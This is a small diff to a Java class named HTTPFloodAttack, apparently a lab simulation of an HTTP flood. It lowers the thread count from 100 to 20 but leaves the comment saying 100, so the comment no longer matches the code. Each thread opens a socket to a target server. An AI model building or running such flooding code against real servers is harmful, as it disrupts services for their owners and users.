@@ -8,7 +8,7 @@ public class HTTPFloodAttack {
     private static final int SERVER_PORT = 5000;
 
     public static void main(String[] args) {
-        for (int i = 0; i < 100; i++) { // Simulate 100 HTTP requests
+        for (int i = 0; i < 20; i++) { // Simulate 100 HTTP requests
             new Thread(() -> {
                 try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
                      OutputStream out = socket.getOutputStream()) {
